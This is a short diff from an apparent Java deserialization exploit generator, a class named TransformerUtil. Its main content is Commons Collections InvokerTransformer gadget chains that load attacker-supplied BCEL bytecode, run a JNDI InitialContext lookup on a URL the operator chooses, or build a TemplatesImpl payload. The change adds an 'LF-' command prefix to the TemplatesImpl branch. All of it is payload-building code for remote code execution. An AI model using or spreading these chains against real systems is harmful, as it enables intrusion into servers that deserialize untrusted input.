@@ -58,7 +58,7 @@ public class TransformerUtil {
 			transformers = new Transformer[]{new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{command.split("[-]")[1]}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
 		} else if (command.startsWith("JD-")) {
 			transformers = new Transformer[]{new ConstantTransformer(javax.naming.InitialContext.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{command.split("[-]")[1]}), new ConstantTransformer(1)};
-		} else if (command.startsWith("EX-")) {
+		} else if (command.startsWith("EX-") || command.startsWith("LF-")) {
 			IS_INHERIT_ABSTRACT_TRANSLET = false;
 			createTemplatesImpl(command);
 
